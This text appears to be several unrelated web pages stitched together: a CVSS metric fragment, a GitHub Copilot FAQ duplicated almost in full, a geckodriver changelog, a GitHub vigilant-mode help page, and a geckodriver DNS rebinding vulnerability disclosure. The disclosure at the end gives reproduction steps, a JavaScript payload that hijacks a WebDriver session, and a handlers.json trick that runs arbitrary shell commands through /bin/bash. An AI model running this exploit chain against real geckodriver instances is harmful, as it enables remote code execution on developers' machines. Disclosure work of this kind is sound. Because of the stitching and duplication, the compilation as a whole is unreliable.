More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

### Frequently asked questions

#### General

#### What is GitHub Copilot?

GitHub Copilot transforms the developer experience. Backed by the leaders in AI, Copilot provides contextualized assistance throughout the software development lifecycle, from code completions and chat assistance in the IDE to code explanations and answers to docs in GitHub and more. With Copilot elevating their workflow, developers can focus on more: value, innovation, and happiness.

GitHub Copilot enables developers to focus more energy on problem solving and collaboration and spend less effort on the mundane and boilerplate. That’s why developers who use Copilot report up to 75% higher satisfaction with their jobs than those who don’t and are up to 55% more productive at writing code without sacrifice to quality, which all adds up to engaged developers shipping great software faster.

GitHub Copilot integrates with leading editors, including Visual Studio Code, Visual Studio, JetBrains IDEs, and Neovim, and, unlike other AI coding assistants, is natively built into GitHub. Growing to millions of individual users and tens of thousands of business customers, Copilot is the world’s most widely adopted AI developer tool and the competitive advantage developers ask for by name.

GitHub Copilot Free is a new free pricing tier with limited functionality for individual developers. Users assigned a Copilot Business or Copilot Enterprise seat are not eligible for access. Users with access to Copilot Pro through a paid subscription, trial, or through an existing verified OSS, Student, Faculty, or MVP account may elect to use Free instead.

#### What languages, IDEs, and platforms does GitHub Copilot support?

GitHub Copilot is trained on all languages that appear in public repositories. For each language, the quality of suggestions you receive may depend on the volume and diversity of training data for that language. For example, JavaScript is well-represented in public repositories and is one of GitHub Copilot’s best supported languages. Languages with less representation in public repositories may produce fewer or less robust suggestions.

GitHub Copilot is available as an extension in Visual Studio Code, Visual Studio, Vim, Neovim, the JetBrains suite of IDEs, and Azure Data Studio. Although code completion functionality is available across all these extensions, chat functionality is currently available only in Visual Studio Code, JetBrains and Visual Studio. GitHub Copilot is also supported in terminals through GitHub CLI and as a chat integration in Windows Terminal Canary. With the GitHub Copilot Enterprise plan, GitHub Copilot is natively integrated into GitHub.com. All plans are supported in GitHub Copilot in GitHub Mobile. GitHub Mobile for Copilot Pro and Copilot Business have access to Bing and public repository code search. Copilot Enterprise in GitHub Mobile gives you additional access to your organization's knowledge.

#### Does GitHub Copilot “copy/paste”?

No, GitHub Copilot generates suggestions using probabilistic determination.

* When thinking about intellectual property and open source issues, it is critical to understand how GitHub Copilot really works. The AI models that create Copilot’s suggestions may be trained on public code, but do not contain any code. When they generate a suggestion, they are not “copying and pasting” from any codebase.
* To generate a code suggestion, the Copilot extension begins by examining the code in your editor—focusing on the lines just before and after your cursor, but also information including other files open in your editor and the URLs of repositories or file paths to identify relevant context. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat in the code editor, the Copilot extension creates a contextual prompt by combining your prompt with additional context including the code file open in your active document, your code selection, and general workspace information, such as frameworks, languages, and dependencies. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.
* To generate a suggestion for chat on GitHub.com, such as providing an answer to a question from your chat prompt, Copilot creates a contextual prompt by combining your prompt with additional context including previous prompts, the open pages on GitHub.com as well as retrieved context from your codebase or Bing search. That information is sent to Copilot’s model, to make a probabilistic determination of what is likely to come next and generate suggestions.

#### Privacy

#### What personal data does GitHub Copilot process?

GitHub Copilot processes personal data based on how Copilot is accessed and used: whether via GitHub.com, mobile app, extensions, or one of various IDE extensions, or through features like suggestions for the command line interface (CLI), IDE code completions, or personalized chat on GitHub.com. The types of personal data processed may include:

* **User Engagement Data:** This includes pseudonymous identifiers captured on user interactions with Copilot, such as accepted or dismissed completions, error messages, system logs, and product usage metrics.
* **Prompts:** These are inputs for chat or code, along with context, sent to Copilot's AI to generate suggestions.
* **Suggestions:** These are the AI-generated code lines or chat responses provided to users based on their prompts.
* **Feedback Data:** This comprises real-time user feedback, including reactions (e.g., thumbs up/down) and optional comments, along with feedback from support tickets.

#### Does GitHub use Copilot Business or Enterprise data to train GitHub’s model?

No. GitHub does not use either Copilot Business or Enterprise data to train its models.

#### How does GitHub use the Copilot data?

How GitHub uses Copilot data depends on how the user accesses Copilot and for what purpose. Users can access GitHub Copilot through the web, extensions, mobile apps, computer terminal, and various IDEs (Integrated Development Environments). GitHub generally uses personal data to:

* Deliver, maintain, and update the services as per the customer's configuration and usage, to ensure personalized experiences and recommendations
* Troubleshoot, which involves preventing, detecting, resolving, and mitigating issues, including security incidents and product-related problems, by fixing software bugs and maintaining the online services' functionality and up-to-dateness
* Enhance user productivity, reliability, effectiveness, quality, privacy, accessibility, and security by keeping the service current and operational

These practices are outlined in GitHub’s Data Protection Agreement ([DPA)](https://github.com/customer-terms/github-data-protection-agreement), which details our data handling commitments to our data controller customers.

GitHub also uses certain personal data with customer authorization under the DPA, for the following purposes:

* Billing and account management
* To comply with and resolve legal obligations
* For abuse detection, prevention, and protection, virus scanning, and scanning to detect violations of terms of service
* To generate summary reports for calculating employee commissions and partner incentives
* To produce aggregated reports for internal use and strategic planning, covering areas like forecasting, revenue analysis, capacity planning, and product strategy,

For details on GitHub's data processing activities as a controller, particularly for Copilot Pro customers, refer to the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement).

#### How long does GitHub retain Copilot data for Business and Enterprise customers?

If and for how long GitHub’s retains Copilot data depends on how a Copilot user accesses Copilot and for what purpose. The default settings for Copilot Business and Enterprise Customers are as follows:

**Access through IDE for Chat and Code Completions:**

* Prompts and Suggestions: Not retained
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

**All other GitHub Copilot access and use:**

* Prompts and Suggestions: Retained for 28 days.
* User Engagement Data: Kept for two years.
* Feedback Data: Stored for as long as needed for its intended purpose.

#### Why do some Copilot features retain prompts and suggestions?

Retaining prompts and suggestions is necessary for chat on github.com, mobile, and CLI Copilot because those features’ effectiveness depends on using thread history to improve responses. The Copilot model requires access to previous interactions to deliver accurate and relevant suggestions.

#### Does GitHub Copilot support compliance with the GDPR and other data protection laws?

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

#### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

Yes. GitHub and customers can enter a [Data Protection Agreement](https://github.com/customer-terms/github-data-protection-agreement) that supports compliance with the GDPR and similar legislation.

#### Does GitHub Copilot ever output personal data?

While we've designed GitHub Copilot with privacy in mind, the expansive definition of personal data under legislation like the EU’s General Data Protection Regulation (GDPR) means we can't guarantee it will never output such data. The Large Language Model (LLM) powering GitHub Copilot was trained on public code and there were instances in our tests where the tool made suggestions resembling personal data. These suggestions were typically synthesized and not tied to real individuals.

#### How does Copilot allow users to access, alter or delete personal data?

These actions are available to Copilot users as described in the [GitHub Privacy Statement](https://docs.github.com/en/site-policy/privacy-policies/github-general-privacy-statement#your-privacy-rights).

### Responsible AI

#### What are the intellectual property considerations when using GitHub Copilot?

The primary IP considerations for GitHub Copilot relate to copyright. The model that powers Copilot is trained on a broad collection of publicly accessible code, which may include copyrighted code, and Copilot’s suggestions (in rare instances) may resemble the code its model was trained on. Here’s some basic information you should know about these considerations:

Copyright law permits the use of copyrighted works to train AI models:  Countries around the world have provisions in their copyright laws that enable machines to learn, understand, extract patterns, and facts from copyrighted materials, including software code. For example, the European Union, Japan, and Singapore, have express provisions permitting machine learning to develop AI models. Other countries including Canada, India, and the United States also permit such training under their fair use/fair dealing provisions. GitHub Copilot’s AI model was trained with the use of code from GitHub’s public repositories—which are publicly accessible and within the scope of permissible copyright use.

What about copyright risk in suggestions? In rare instances (less than 1% based on GitHub’s research), suggestions from GitHub may match examples of code used to train GitHub’s AI model. Again, Copilot does not “look up” or “copy and paste” code, but is instead using context from a user’s workspace to synthesize and generate a suggestion.

Our experience shows that matching suggestions are most likely to occur in two situations: (i) when there is little or no context in the code editor for Copilot’s model to synthesize, or (ii) when a matching suggestion represents a common approach or method. If a code suggestion matches existing code, there is risk that using that suggestion could trigger claims of copyright infringement, which would depend on the amount and nature of code used, and the context of how the code is used. In many ways, this is the same risk that arises when using any code that a developer does not originate, such as copying code from an online source, or reusing code from a library. That is why responsible organizations and developers recommend that users employ code scanning policies to identify and evaluate potential matching code.

In Copilot, you can opt whether to allow Copilot to suggest code completions that match publicly available code on GitHub.com. For more information, see "[Configuring GitHub Copilot settings on GitHub.com](https://docs-internal-46619-d1aa34.preview.ghdocs.com/en/copilot/configuring-github-copilot/configuring-github-copilot-settings-on-githubcom#enabling-or-disabling-duplication-detection)". If you have allowed suggestions that match public code, GitHub Copilot can provide you with details about the matching code when you accept such suggestions. Matching code does not necessarily mean copyright infringement, so it is ultimately up to the user to determine whether to use the suggestion, and what and who to attribute (along with other license compliance) in appropriate circumstances.

#### Does GitHub Copilot include a filtering mechanism to mitigate risk?

Yes, GitHub Copilot does include an optional code referencing filter to detect and suppress certain suggestions that match public code on GitHub.

* GitHub has created a duplication detection filter to detect and suppress suggestions that contain code segments over a certain length that match public code on GitHub. This filter can be enabled by the administrator for your enterprise and it can apply for all organizations within your enterprise, or the administrator can defer control to individual organizations.
* With the filter enabled, Copilot checks code suggestions for matches or near-matches against public code on GitHub of 65 lexemes or more (on average,150 characters). If there is a match, the suggestion will not be shown to the user.
* In addition to off-topic, harmful, and offensive output filters, GitHub Copilot also scans the outputs for vulnerable code.

#### Does GitHub Copilot include features to make it easier for users to identify potentially relevant open source licenses for matching suggestions?

Yes, GitHub Copilot is previewing a [code referencing feature](https://github.blog/2023-08-03-introducing-code-referencing-for-github-copilot/) as an additional tool to assist users to find and review potentially relevant open source licenses. Code referencing is currently available in Visual Studio Code. This feature searches across public GitHub repositories for code that matches a Copilot suggestion. If there’s a match, users will find its information displayed in the Copilot console log, including where the match occurred, any applicable licenses, and a deep link to learn more. The deep link will take users to a navigable page on GitHub.com to browse examples of the code match and their repository licenses, and see how many repositories—including ones without licenses—that code appears in, as well as links to those repositories. Copilot users can review this information to determine whether the applicable suggestions are suitable for use, and whether additional measures may be necessary to use them.

#### Who owns the suggestions provided by GitHub Copilot?

We don’t determine whether a suggestion is capable of being owned, but we are clear that GitHub does not claim ownership of a suggestion. Whether a suggestion generated by an AI model can be owned depends on many factors (e.g. the intellectual property law in the relevant country, the length of the suggestion, the extent that suggestion is considered ‘functional’ instead of expressive, etc).

* If a suggestion is capable of being owned, our terms are clear: GitHub does not claim ownership.
* GitHub does not claim ownership of any suggestion. In certain cases, it is possible for Copilot to produce similar suggestions to different users. For example, two unrelated users both starting new files to code the quicksort algorithm in Java will likely get the same suggestion. The possibility of providing similar suggestions to multiple users is a common part of generative AI systems.

#### Can GitHub Copilot introduce insecure code in its suggestions?

Public code may contain insecure coding patterns, bugs, or references to outdated APIs or idioms. When GitHub Copilot synthesizes code suggestions based on this data, it can also synthesize code that contains these undesirable patterns. Copilot has filters in place that either block or notify users of insecure code patterns that are detected in Copilot suggestions. These filters target the most common vulnerable coding patterns, including [hardcoded credentials](https://cwe.mitre.org/data/definitions/798.html), [SQL injections](https://cwe.mitre.org/data/definitions/89.html), and [path injections](https://cwe.mitre.org/data/definitions/22.html). Additionally, in recent years we’ve provided tools such as GitHub Advanced Security, GitHub Actions, Dependabot, and CodeQL to open source projects to help improve code quality. Of course, you should always use GitHub Copilot together with good testing and code review practices and security tools, as well as your own judgment.

#### Is GitHub Copilot intended to fully automate code generation and replace developers?

No. Copilot is a tool intended to make developers more efficient. It’s not intended to replace developers, who should continue to apply the same sorts of safeguards and diligence they would apply with regard to any third-party code of unknown origin.

* The product is called “Copilot” not “Autopilot” and it’s not intended to generate code without oversight. You should use exactly the same sorts of safeguards and diligence with Copilot’s suggestions as you would use with any third-party code.
* Identifying best practices for use of third party code is beyond the scope of this section. That said, whatever practices your organization currently uses – rigorous functionality testing, code scanning, security testing, etc. – you should continue these policies with Copilot’s suggestions. Moreover, you should make sure your code editor or editor does not automatically compile or run generated code before you review it.

#### Can GitHub Copilot users simply use suggestions without concern?

Not necessarily. GitHub Copilot users should align their use of Copilot with their respective risk tolerances.

* As noted above, GitHub Copilot is not intended to replace developers, or their individual skill and judgment, and is not intended to fully automate the process of code development. The same risks that apply to the use of any third-party code apply to the use of Copilot’s suggestions.
* Depending on your particular use case, you should consider implementing the protections discussed above. It is your responsibility to assess what is appropriate for the situation and implement appropriate safeguards.
* You’re entitled to IP indemnification from GitHub for the unmodified suggestions when Copilot’s filtering is enabled. If you do elect to enable this feature, the copyright responsibility is ours, not our customers. As part of our ongoing commitment to responsible AI, GitHub and Microsoft extends our IP indemnity and protection support to our customers who are empowering their teams with GitHub Copilot. See [Microsoft's Copilot Copyright Commitment](https://blogs.microsoft.com/on-the-issues/2023/09/07/copilot-copyright-commitment-ai-legal-concerns/) for more details.

#### Does GitHub Copilot support accessibility features?

We are conducting internal testing of GitHub Copilot’s ease of use by developers with disabilities and working to ensure that GitHub Copilot is accessible to all developers. Please feel free to share your feedback on GitHub Copilot accessibility in our [feedback forum](https://github.com/github-community/community/discussions/categories/copilot).

#### Does GitHub Copilot produce offensive outputs?

GitHub Copilot includes filters to block offensive language in the prompts and to avoid synthesizing suggestions in sensitive contexts. We continue to work on improving the filter system to more intelligently detect and remove offensive outputs. If you see offensive outputs, please report them directly to copilot-safety@github.com so that we can improve our safeguards. GitHub takes this challenge very seriously and we are committed to addressing it.

#### Will GitHub Copilot work as well using languages other than English?

Given public sources are predominantly in English, GitHub Copilot will likely work less well in scenarios where natural language prompts provided by the developer are not in English and/or are grammatically incorrect. Therefore, non-English speakers might experience a lower quality of service.

#### What data has GitHub Copilot been trained on?

GitHub Copilot is powered by generative AI models developed by GitHub, OpenAI, and Microsoft. It has been trained on natural language text and source code from publicly available sources, including code in public repositories on GitHub.

1. Data from June 2023. Additional research can be found [here](https://github.blog/news-insights/research/the-economic-impact-of-the-ai-powered-developer-lifecycle-and-lessons-from-github-copilot/).
2. Feature in public beta for Copilot Pro and Business plans. Requires use of repositories, issues, discussions, Actions, and other features of GitHub.
3. Authentication with SAML single sign-on (SSO) available for organizations using GitHub Enterprise Cloud.

## 0.30.0 (2021-09-16, `d372710b98a6`)

### Security Fixes

* [CVE-2021-4138](https://github.com/advisories/GHSA-2h28-m3qw-8www "CVE-2021-4138")

  Fixed a DNS rebinding issues by enforcing a stricter `Host` header check.

  Reported by Gabriel Corona.

  + Improved `Host` header checks to reject requests not sent to a well-known

    local hostname or IP, or the server-specified hostname..

### Known problems

* geckodriver restricts connections to local IP addresses. This can interfere

  with deployments in which geckodriver is running on a different network node

  to the tests e.g. some container or virtual-machine based setups.
* *macOS 10.15 (Catalina) and later:*

  Due to the requirement from Apple that all programs must be

  notarized, geckodriver will not work on Catalina if you manually

  download it through another notarized program, such as Firefox.

  Whilst we are working on a repackaging fix for this problem, you can

  find more details on how to work around this issue in the [macOS

  notarization](https://firefox-source-docs.mozilla.org/testing/geckodriver/Notarization.html) section of the documentation.
* *Android:*

  For releases of Firefox 89.0 and earlier Marionette will only be enabled in

  GeckoView based applications when the Firefox preference

  `devtools.debugger.remote-enabled` is set to `true` via

  [`moz:firefoxOptions`](https://developer.mozilla.org/en-US/docs/Web/WebDriver/Capabilities/firefoxOptions).

### Added

* Support for WebDriver clients to opt in to WebDriver BiDi.

  Introduced the new boolean capability [`webSocketUrl`](https://developer.mozilla.org/en-US/docs/Web/WebDriver/Capabilities/webSocketUrl) that can be used by

  WebDriver clients to opt in to a bidirectional connection. A string capability

  with the same name will be returned by [`NewSession`](https://w3c.github.io/webdriver/webdriver-spec.html#new-session), which contains the

  WebSocket URL of the newly created WebDriver session in the form of:

  `ws://host:port/session/<session id>`.

  When running on Android a port forward will be set on the host machine,

  which is using the exact same port as on the device.

  All the supported WebDriver BiDi commands depend on the version of

  Firefox, and not geckodriver. The first commands will be shipped in

  Firefox 94.
* It's now possible to set additional preferences when a custom profile has been

  specified. At the end of the session they will be removed.

### Fixed

* Added validation that the `--host` argument resolves to a local IP address.
* Limit the `--foreground` argument of Firefox to MacOS only.
* Increased Marionette handshake timeout to not fail for slow connections.
* `Marionette:Quit` is no longer sent twice during session deletion.
* When deleting a session that was attached to an already running browser

  instance, the browser is not getting closed anymore.
* Android

  + Starting Firefox on Android from a Windows based host will now succeed as

    we are using the correct Unix path separator to construct on-device paths.
  + Arguments as specified in [`moz:firefoxOptions`](https://developer.mozilla.org/en-US/docs/Web/WebDriver/Capabilities/firefoxOptions) are now used when starting Firefox.
  + Port forwards set for Marionette and the WebSocket server (WebDriver BiDi)

    are now correctly removed when geckodriver exits.
  + The test root folder is now removed when geckodriver exists.

# Displaying verification statuses for all of your commits

You can enable vigilant mode for commit signature verification to mark all of your commits and tags with a signature verification status.

## In this article

* [About vigilant mode](#about-vigilant-mode)
* [Enabling vigilant mode](#enabling-vigilant-mode)
## [About vigilant mode](#about-vigilant-mode)

When you work locally on your computer, Git allows you to set the author of your changes and the identity of the committer. This, potentially, makes it difficult for other people to be confident that commits and tags you create were actually created by you. To help solve this problem you can sign your commits and tags. For more information, see [Signing commits](/en/authentication/managing-commit-signature-verification/signing-commits) and [Signing tags](/en/authentication/managing-commit-signature-verification/signing-tags). GitHub marks signed commits and tags with a verification status.

By default commits and tags are marked "Verified" if they are signed with a GPG, SSH, or S/MIME key that was successfully verified. If a commit or tag has a signature that can't be verified by GitHub, we mark the commit or tag "Unverified." In all other cases no verification status is displayed.

However, you can give other users increased confidence in the identity attributed to your commits and tags by enabling vigilant mode in your GitHub settings. With vigilant mode enabled, all of your commits and tags are marked with one of three verification statuses:

| Status | Description |
| --- | --- |
| **Verified** | The commit is signed, the signature was successfully verified, and the committer is the only author who has enabled vigilant mode. |
| **Partially verified** | The commit is signed, and the signature was successfully verified, but the commit has an author who: a) is not the committer and b) has enabled vigilant mode. In this case, the commit signature doesn't guarantee the consent of the author, so the commit is only partially verified. |
| **Unverified** | Any of the following is true:- The commit is signed but the signature could not be verified.- The commit is not signed and the committer has enabled vigilant mode.- The commit is not signed and an author has enabled vigilant mode. |

You should only enable vigilant mode if you sign all of your commits and tags and use an email address that is verified for your account on GitHub as your committer email address. After enabling this mode, any unsigned commits or tags that you generate locally and push to GitHub will be marked "Unverified."

You can check the verification status of your signed commits or tags on GitHub and view why your commit signatures might be unverified. For more information, see [Checking your commit and tag signature verification status](/en/authentication/troubleshooting-commit-signature-verification/checking-your-commit-and-tag-signature-verification-status).

## [Enabling vigilant mode](#enabling-vigilant-mode)

1. In the upper-right corner of any page on GitHub, click your profile photo, then click  **Settings**.
2. In the "Access" section of the sidebar, click  **SSH and GPG keys**.
3. Under "Vigilant mode," select **Flag unsigned commits as unverified**.

|  | |

geckodriver is vulnerable to DNS rebinding attack.

A malicious origin can send requests to a geckodriver instance

(create a new session, navigate, etc.).

In contrast to the CSRF vulnerability previously reported,

when using this vulnerability, an attacker can see the responses

of the attacked geckodriver instance and can thus interact

with the created session. This could be used:

* to attack local services (localhost-bound or on the local network);
* to attack remote services using the IP address of the victim;
* reading local files (by navigating to `file://`);
* running other programs by navigating to URIs with other schemes;
* remote code execution (see below).

This vulnerability has been tested on:

* Mozilla Firefox Nightly 80.0a1 (2020-07-13)
* geckodriver 0.26.0 (e9783a644016 2019-10-10 13:38 +0000)
* Debian testing

## Reproduction steps

1. Get a domaine name under your control (in this example I'm using `rebind.netlib.re` controlled using <https://netlib.re/>)
2. Run geckodriver, `geckodriver`
3. Serve the proof-of-concept (see attachment), `python3 -m http.server --bind 127.0.0.99 4444`
4. Associate your domain name to the IP address of the payload server with a short TTL (`@ A 5 127.0.99`)
5. Open this website in a web browser (`firefox http://rebind.netlib.re:4444`)
6. Associate your domain name to the IP address of the geckodriver instance (`@ A 5 127.0.1`))
7. Wait (appoximately one minute) for the browser to hit the geckodriver instance

This process can be automated (and accelerated) using dedicated DNS rebinding frameworks.

Payload:

```
function sleep(delay) {
  return new Promise((resolve, reject) => {setInterval(resolve, delay);});
}
async function createSession() {
  while (true) {
    const response = await fetch("/session", {
        method: "POST",
        mode: "same-origin",
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          "capabilities": {
            "alwaysMatch": {
            }
          }
        })
    });
    if (response.status >= 200 && response.status < 300)
      return response.json();
    await sleep(1000);
  }
}
async function main() {
  const creation = await createSession();
  const sessionId = creation.value.sessionId;
  const sessionPath = "/session/" + sessionId;
  fetch(sessionPath + "/url", {
    method: "POST",
    mode: "same-origin",
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      "url": "https://www.youtube.com/watch?v=oHg5SJYRHA0"
    })
  });
}
main()

```
## Getting remote code execution

As the attacker can control the Firefox instance, we can now find

new ways to execute arbitrary shell commands (`see main2.html`).

By using the `profile` parameters, the attacker can set this `handlers.json` file:

```
{"defaultHandlersVersion":{"fr":3},"mimeTypes":{"application/pdf":{"action":2,"extensions":["pdf"],"handlers":[{"name":"bash","path":"/bin/bash"}]}},"schemes":{"irc":{"stubEntry":true,"handlers":[null,{"name":"Mibbit","uriTemplate":"https://www.mibbit.com/?url=%s"}]},"ircs":{"stubEntry":true,"handlers":[null,{"name":"Mibbit","uriTemplate":"https://www.mibbit.com/?url=%s"}]},"mailto":{"stubEntry":true,"handlers":[null,{"name":"Yahoo! Mail","uriTemplate":"https://compose.mail.yahoo.com/?To=%s"},{"name":"Gmail","uriTemplate":"https://mail.google.com/mail/?extsrc=mailto&url=%s"}]}}}

```

Using this configuration file, the Firefox instance will use

`/bin/bash` for opening PDF file.

The PDF we are going to serve is actually a bash script:

```
xterm -e nyancat

```

The attacker can redirect the Firefox instance under his control

to this shell script (served as a PDF): Firefox will use

`bash` to open this file. Using this construct the

attacker can execute an arbitrary system command as the user.

## Mitigations

### Checking the Host header

geckodriver is vulnerable to DNS rebinding attacks because it is accepting

requests using arbitrary `Host` header (eg. `Host: rebind.netlib.re`).

